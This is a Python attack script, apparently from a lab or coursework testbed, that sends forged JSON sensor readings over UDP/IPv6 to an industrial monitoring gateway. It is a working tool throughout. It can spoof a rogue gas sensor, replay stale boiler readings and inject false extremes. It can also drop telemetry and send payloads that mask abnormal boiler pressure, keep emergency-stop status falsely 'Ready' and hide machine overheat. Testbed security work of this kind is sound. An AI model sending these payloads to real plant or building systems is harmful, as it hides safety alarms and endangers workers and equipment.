#!/usr/bin/env python3
import argparse
import json
import socket
import time
from datetime import datetime, timezone


def utc_now():
    return datetime.now(timezone.utc).isoformat()


def spoof_payloads():
    return [
        {
            "sensor_id": "GAS-BAY-ROGUE",
            "node_id": "node-04",
            "label": "Loading Bay",
            "gas_leak": "Gas detected",
            "occupancy": "Occupied",
            "air_quality": 760.0,
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "spoof",
        }
    ]


def replay_payloads():
    return [
        {
            "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": 24.4,
            "gas_leak": "Normal",
            "pressure_status": "Normal",
            "emergency_stop": "Ready",
            "unit": "mixed",
            "timestamp": "2026-07-01T00:00:00+00:00",
            "attack": "replay",
        }
    ]


def extreme_payloads():
    return [
        {
            "sensor_id": "TEMP-LINE,HUM-LINE,OVERHEAT-LINE,ESTOP-LINE",
            "node_id": "node-02",
            "label": "Process Line",
            "temperature": 65.0,
            "humidity": 18.0,
            "machine_overheat": "Overheat detected",
            "emergency_stop": "Emergency stop active",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "false_extreme",
        }
    ]


def missing_payloads():
    return [
        {
            "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": 22.8,
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "missing_telemetry",
        },
        {
            "sensor_id": "TEMP-LINE,HUM-LINE,OVERHEAT-LINE,ESTOP-LINE",
            "node_id": "node-02",
            "label": "Process Line",
            "humidity": 48.6,
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "missing_telemetry",
        },
        {
            "sensor_id": "TEMP-COLD,HUM-COLD,DOOR-COLD,AIR-COLD",
            "node_id": "node-03",
            "label": "Cold Storage",
            "occupancy": "Occupied",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "missing_telemetry",
        },
    ]


def malformed_payloads():
    return [
        {
            "sensor_id": "PROTO-BAD-01",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": "not-a-temperature",
            "pressure_status": "???",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "malformed_protocol",
        }
    ]


def boiler_pressure_masked_payloads():
    return [
        {
            "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": 78.4,
            "gas_leak": "Normal",
            "pressure_status": "Normal",
            "emergency_stop": "Ready",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "boiler_pressure_masked",
        }
    ]


def emergency_stop_hidden_payloads():
    return [
        {
            "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": 74.9,
            "pressure_status": "Pressure abnormal",
            "emergency_stop": "Ready",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "emergency_stop_hidden",
        }
    ]


def machine_overheat_hidden_payloads():
    return [
        {
            "sensor_id": "TEMP-LINE,HUM-LINE,OVERHEAT-LINE,ESTOP-LINE",
            "node_id": "node-02",
            "label": "Process Line",
            "temperature": 86.3,
            "machine_overheat": "Normal",
            "emergency_stop": "Ready",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "machine_overheat_hidden",
        }
    ]


ATTACKS = {
    "spoof": {
        "payloads": spoof_payloads,
        "impact": "A fake sensor identity can influence dashboard temperature if the gateway trusts valid JSON only.",
    },
    "replay": {
        "payloads": replay_payloads,
        "impact": "A stale but valid reading can appear current when freshness is not checked.",
    },
    "extreme": {
        "payloads": extreme_payloads,
        "impact": "A syntactically valid extreme value can create a safety-relevant dashboard condition.",
    },
    "missing": {
        "payloads": missing_payloads,
        "impact": "The air-quality sensor is omitted, showing loss of visibility rather than a malformed packet.",
    },
    "malformed": {
        "payloads": malformed_payloads,
        "impact": "A syntactically valid message carries unexpected scalar values into the MQTT relay.",
    },
    "boiler-pressure-masked": {
        "payloads": boiler_pressure_masked_payloads,
        "impact": "Boiler Room pressure is reported normal while other process readings suggest a dangerous condition.",
    },
    "emergency-stop-hidden": {
        "payloads": emergency_stop_hidden_payloads,
        "impact": "Emergency stop status remains falsely ready during abnormal boiler pressure.",
    },
    "machine-overheat-hidden": {
        "payloads": machine_overheat_hidden_payloads,
        "impact": "Process Line overheat is hidden while temperature is unsafe.",
    },
}


def main():
    parser = argparse.ArgumentParser(description="Send controlled Milestone 6 attack telemetry over UDP/IPv6.")
    parser.add_argument("--attack", required=True, choices=sorted(ATTACKS), help="Attack activity to run.")
    parser.add_argument("--source", default=None, help="Optional source IPv6 address to bind.")
    parser.add_argument("--dest", required=True, help="Destination IPv6 address.")
    parser.add_argument("--port", type=int, default=9999, help="Destination UDP port.")
    parser.add_argument("--interval", type=float, default=0.5, help="Seconds between payloads.")
    args = parser.parse_args()

    attack = ATTACKS[args.attack]
    payloads = attack["payloads"]()

    print(f"attack activity: {args.attack}", flush=True)
    print(f"expected impact: {attack['impact']}", flush=True)

    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    if args.source:
        sock.bind((args.source, 0))

    for index, reading in enumerate(payloads, start=1):
        payload = json.dumps(reading, separators=(",", ":")).encode("utf-8")
        sock.sendto(payload, (args.dest, args.port))
        node_id = reading.get("node_id", "unknown-node")
        label = reading.get("label", reading.get("sensor_id", "unknown sensor"))
        changed_fields = sorted(set(reading) - {"sensor_id", "node_id", "label", "unit", "timestamp", "attack"})
        summary = ", ".join(f"{field} <- {reading[field]}" for field in changed_fields)
        print(f"{label} ({node_id}): {summary}", flush=True)
        print(f"sent attack reading {index}/{len(payloads)}: {json.dumps(reading)}", flush=True)
        if index < len(payloads):
            time.sleep(args.interval)


if __name__ == "__main__":
    main()
